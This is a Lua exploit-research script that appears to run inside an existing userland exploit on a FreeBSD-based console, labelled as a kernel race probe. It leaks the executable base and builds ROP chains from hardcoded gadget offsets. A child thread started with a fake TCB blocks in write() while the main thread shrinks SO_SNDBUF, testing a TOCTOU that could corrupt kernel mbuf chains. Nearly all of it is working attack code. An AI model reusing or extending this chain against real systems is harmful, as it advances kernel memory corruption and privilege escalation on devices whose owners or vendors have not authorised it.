-- CRASH_CLASS: MODERATE
-- PROBE 93c: SO_SNDBUF concurrent race — child blocked in sosend, main shrinks hiwat
--
-- Theory: sosend_generic() computes space=sbspace() under SOCKBUF_LOCK, drops it,
-- then calls m_uiotombuf()/sbwait(). setsockopt(SO_SNDBUF) takes SOCKBUF_LOCK
-- but NOT sblock. If child is sleeping in sbwait with stale space, and main
-- shrinks sb_hiwat, then reader drains → wakes child → child appends using
-- stale space calculation → sb_cc > sb_hiwat → potential mbuf chain corruption.
--
-- Design:
--   1. socketpair, set SO_SNDBUF=65536
--   2. Main fills buffer to capacity (MSG_DONTWAIT)
--   3. Child does blocking write(16384) — blocks in sbwait (buffer full)
--   4. Main shrinks SO_SNDBUF to 1 (while child holds sblock)
--   5. Main drains read side → wakes child
--   6. Child's stale space may let it append 16384 bytes despite hiwat=1
--   7. Main reads total bytes from read side — if > hiwat, race won

print("=== PROBE 93c: SO_SNDBUF concurrent race ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function fmt(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%08X%08X", val.h, val.l)
    end
    return string.format("0x%X", N(val))
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base for gadgets
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_pop_rcx  = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67   -- mov [rdi], rax; ret

-- Ignore SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Fake TCB for child threads
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))

local sv = memory.alloc(4)
local ov = memory.alloc(4)
local ol = memory.alloc(4)
local dbuf = memory.alloc(0x1000)

-- Child write buffer — 4KB of 0x42
local child_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(child_buf) + i, 0x42424242) end

local TRIALS = 20
local anomalies = 0

for trial = 1, TRIALS do
    if not alive() then print("DEAD at trial " .. trial); break end

    -- Shared result: child stores write() return value here
    local child_ret = memory.alloc(8)
    wq(N(child_ret), uint64(0xDEAD))

    -- socketpair
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp)+4, 0)
    local r = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    if r ~= 0 then print("t" .. trial .. ": socketpair fail"); break end
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp)+4) or -1

    -- SO_SNDBUF = 65536
    wd(N(sv), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)

    -- Fill to capacity with MSG_DONTWAIT
    local filled = 0
    for i = 1, 300 do
        local ok2, ret = pcall(function()
            return mk(133)(uint64(fW), uint64(N(child_buf)), uint64(256), uint64(0x80))
        end)
        if not ok2 then break end
        local v = sgn(ret)
        if v <= 0 then break end
        filled = filled + v
    end

    -- Build child ROP: sysarch(SET_FSBASE) then write(fW, child_buf, 4096) BLOCKING
    -- Then store return value to child_ret, then thr_exit
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x4000 - ((sb + 0x4000) % 16) - 8
    for i = 0, 0x3FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch(SET_FSBASE=129, &fake_tcb)
    local fsbase_ptr = memory.alloc(8)
    wq(N(fsbase_ptr), uint64(N(fake_tcb)))
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)

    -- write(fW, child_buf, 4096) — BLOCKING, no MSG_DONTWAIT
    -- syscall 4 = write(fd, buf, nbytes)
    emit(g_pop_rdi); emit(uint64(fW))
    emit(g_pop_rsi); emit(uint64(N(child_buf)))
    emit(g_pop_rdx); emit(uint64(0x1000))
    emit(g_pop_rax); emit(uint64(4))
    emit(stub)

    -- Store rax (write return) to child_ret
    emit(g_pop_rdi); emit(uint64(N(child_ret)))
    emit(g_mov_m_rax)

    -- thr_exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    -- Spawn child — it will block in write() because sndbuf is full
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_pop_rax)          -- start_func = pop rax; ret (begins ROP)
    wq(N(par) + 0x08, uint64(0))   -- arg (unused)
    wq(N(par) + 0x10, uint64(sb))  -- stack_base
    wq(N(par) + 0x18, uint64(0x4000)) -- stack_size
    local tid_buf = memory.alloc(8); wq(N(tid_buf), uint64(0))
    wq(N(par) + 0x30, tid_buf)
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- Brief spin to let child enter write() and block in sbwait
    for w = 1, 5000 do local _ = rd(sb) end

    -- *** RACE POINT: shrink SO_SNDBUF to 1 while child is blocked ***
    wd(N(sv), 1)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)

    -- Read back actual hiwat
    wd(N(ov), 0); wd(N(ol), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), ov, ol) end)
    local new_hiwat = rd(N(ov)) or -1

    -- Drain the read side — this wakes the child from sbwait
    local drained = 0
    for d = 1, 100 do
        local ok4, dr = pcall(function()
            return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
        end)
        if not ok4 then break end
        local dv = sgn(dr)
        if dv <= 0 then break end
        drained = drained + dv
    end

    -- Wait for child to finish writing + exit
    for w = 1, 100000 do local _ = rd(sb) end

    -- Check child's write return value
    local cret_q = rq(N(child_ret))
    local cret = 0xDEAD
    if cret_q ~= nil then
        local h, l = 0, 0
        if type(cret_q) == "table" and cret_q.h then h = cret_q.h; l = cret_q.l
        else l = N(cret_q) end
        if l >= 0x80000000 and h == 0xFFFFFFFF then
            cret = l - 0x100000000  -- negative (error)
        elseif h == 0 then
            cret = l
        else
            cret = -9999  -- unexpected
        end
    end

    -- Now drain anything the child wrote (after our first drain)
    local child_drained = 0
    for d = 1, 100 do
        local ok5, dr = pcall(function()
            return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
        end)
        if not ok5 then break end
        local dv = sgn(dr)
        if dv <= 0 then break end
        child_drained = child_drained + dv
    end

    local is_anomaly = (cret > 0 and new_hiwat <= 64)
    if is_anomaly then anomalies = anomalies + 1 end

    if is_anomaly or trial <= 3 or trial == TRIALS or trial % 5 == 0 then
        print(string.format("t%d: fill=%d hiwat=%d drain1=%d child_wrote=%d drain2=%d%s",
            trial, filled, new_hiwat, drained, cret, child_drained,
            is_anomaly and " *** RACE WON ***" or ""))
    elseif trial == 4 then
        print("...")
    end

    if cret > new_hiwat and cret ~= 0xDEAD and new_hiwat > 0 then
        print(string.format("  *** CHILD WROTE %d BYTES WITH HIWAT=%d ***", cret, new_hiwat))
    end

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
end

print("")
print(string.format("RESULT: %d/%d anomalies  alive=%s", anomalies, TRIALS, alive() and "Y" or "N"))
if anomalies > 0 then
    print("*** SO_SNDBUF TOCTOU RACE CONFIRMED — child wrote past shrunken hiwat ***")
else
    print("No race detected. Kernel may re-check sbspace after wakeup.")
end
if not alive() then print("*** PROCESS DIED ***") end

print("=== 93c COMPLETE ===")
